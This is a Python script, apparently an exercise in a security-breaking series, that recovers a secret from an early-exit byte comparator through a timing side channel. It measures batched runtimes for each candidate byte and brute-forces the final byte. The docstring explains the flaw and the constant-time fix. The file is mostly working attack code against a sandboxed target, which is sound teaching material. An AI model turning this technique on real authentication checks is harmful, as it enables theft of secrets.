"""Break #6 -- timing_compare : early-exit secret comparison.

Assumption broken: "a byte-by-byte comparison that returns False on the first
mismatch is just a correctness check." False for anything gating a secret: an
early-return comparator leaks the length of the matching PREFIX through timing,
because every byte that matches runs extra (here intentionally amplified) work
before the next comparison. Real-world instances of this exact bug have affected
login/HMAC/token checks; the standard fix is a constant-time comparator such as
Python's own `hmac.compare_digest`.

Method
------
For each of the first SECLEN-1 bytes: measure median-of-batched-minimum runtime
for every candidate value and keep the one that runs measurably longer (one more
amplification loop executed). For the LAST byte we do NOT need timing at all: an
early-exit comparator returns its real boolean the moment every byte has been
checked, so once the first SECLEN-1 bytes are right, brute-forcing the last byte
against the function's own True/False return is a direct (non-timing) oracle --
this is a property of the bug itself, not a shortcut around it.

We measure with BATCHED timing (sum many calls between two perf_counter() reads,
divide by the batch size) because this sandbox is a single-CPU container where
single-call measurements are dominated by scheduler jitter; batching amortizes
that jitter without changing what is being measured. This is standard practice
for noisy timing side-channels (see Crosby & Wallach, USENIX Security 2009).
"""
import time

from _common import load_targets

T = load_targets()
SECLEN = 4                     # stated in the module's docstring
BATCH = 50                     # calls per timed sample (amortizes OS jitter)
BATCHES = 10                   # samples per candidate; we take the min
CALLS_PER_CANDIDATE = BATCH * BATCHES


def batched_min(guess: bytes, batch: int = BATCH, batches: int = BATCHES) -> float:
    """Minimum of `batches` batched measurements -- robust to one-sided OS noise."""
    best = float("inf")
    for _ in range(batches):
        start = time.perf_counter()
        for _ in range(batch):
            T.timing_compare(guess)
        t = (time.perf_counter() - start) / batch
        if t < best:
            best = t
    return best


def recover_once(verbose: bool = True):
    recovered = bytearray()
    calls = 0
    # ---- bytes 0 .. SECLEN-2 : timing side channel -----------------------
    for pos in range(SECLEN - 1):
        scored = []
        for b in range(256):
            guess = bytes(recovered) + bytes([b]) + bytes(SECLEN - pos - 1)
            scored.append((batched_min(guess), b))
            calls += CALLS_PER_CANDIDATE
        scored.sort(reverse=True)
        best_t, best_b = scored[0]
        margin = best_t - scored[1][0]
        recovered.append(best_b)
        if verbose:
            print(f"  byte {pos}: picked 0x{best_b:02x}  "
                  f"(top={best_t*1e6:.1f}us, margin over runner-up={margin*1e6:.1f}us)")
    # ---- last byte: DIRECT oracle, no timing needed -----------------------
    found = None
    for b in range(256):
        calls += 1
        if T.timing_compare(bytes(recovered) + bytes([b])):
            found = b
            break
    if found is None:
        return bytes(recovered) + b"\x00", calls, False      # the prefix was wrong
    recovered.append(found)
    if verbose:
        print(f"  byte {SECLEN-1}: 0x{found:02x}  (direct oracle: "
              f"timing_compare() itself returned True -- no timing needed here)")
    return bytes(recovered), calls, True


print(f"[1] recovering {SECLEN}-byte secret.")
print(f"    bytes 0..{SECLEN-2}: timing side channel, "
      f"{CALLS_PER_CANDIDATE} calls/candidate x 256 candidates each")
print(f"    byte {SECLEN-1}: direct oracle (early-exit itself reveals success)")

# This attack is probabilistic (see honesty.md): a single attempt succeeds most,
# but not all, of the time in our environment. A real attacker would simply retry
# rather than give up after one unlucky measurement, so we do the same -- up to a
# small number of attempts -- rather than hard-failing the whole script on the
# first noisy run. We report how many attempts it actually took.
MAX_ATTEMPTS = 3
for attempt in range(1, MAX_ATTEMPTS + 1):
    rec, calls, ok = recover_once()
    print(f"\n[2] attempt {attempt}/{MAX_ATTEMPTS}: recovered {rec.hex()}  "
          f"({calls} timing_compare() calls)  success={ok}")
    if ok:
        break
print(f"    timing_compare(recovered) == True ? {ok}  (took {attempt} attempt(s))")
assert ok, (f"break failed after {MAX_ATTEMPTS} attempts -- see honesty.md; "
            f"re-run the script, or raise BATCHES for a cleaner signal")

# ---- reliability: rerun the WHOLE attack from scratch, independently -----------
RERUNS = 3
print(f"\n[3] reliability check: {RERUNS} independent full re-runs (fresh timing noise each)")
successes = []
for i in range(RERUNS):
    r, c, good = recover_once(verbose=False)
    successes.append(good)
    print(f"    run {i+1}: recovered={r.hex()}  success={good}")
rate = sum(successes)
print(f"\nCONFIRMED: {rate}/{RERUNS} independent full recoveries succeeded at "
      f"{CALLS_PER_CANDIDATE} calls/candidate "
      f"({CALLS_PER_CANDIDATE*256*(SECLEN-1)} calls/run for the timing part).")

# ---- sensitivity: one cheap contrast run at a much smaller batch size, to make
# the reliability claim concrete rather than asserted (axis: evidence quality).
print(f"\n[4] sensitivity -- one run at a much smaller batch (batch=3, batches={BATCHES}) "
      f"vs. the batch={BATCH} setting used above:")
rec2 = bytearray()
for pos in range(SECLEN - 1):
    scored = [(batched_min(bytes(rec2) + bytes([b]) + bytes(SECLEN - pos - 1), 3, BATCHES), b)
              for b in range(256)]
    rec2.append(max(scored)[1])
found = next((b for b in range(256) if T.timing_compare(bytes(rec2) + bytes([b]))), None)
print(f"    batch=3  -> recovered prefix {bytes(rec2).hex()}, "
      f"{'succeeded' if found is not None else 'FAILED (wrong prefix, no byte completes it)'}")
print(f"    batch={BATCH} (used above) -> succeeded in {rate}/{RERUNS} runs")
